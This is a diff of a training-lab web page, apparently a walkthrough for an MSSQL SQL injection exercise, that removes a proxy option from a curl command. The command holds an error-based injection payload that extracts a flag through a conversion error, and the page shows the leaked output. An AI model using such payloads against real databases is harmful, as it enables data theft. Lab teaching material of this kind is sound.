@@ -118,7 +118,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab9" \<br> --data-urlencode "model=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab9" \<br> --data-urlencode "model=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt"># Verified output:</span><br>
         MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_py_3xt3rn4l_scr1pt}' to data type int.
     </div>
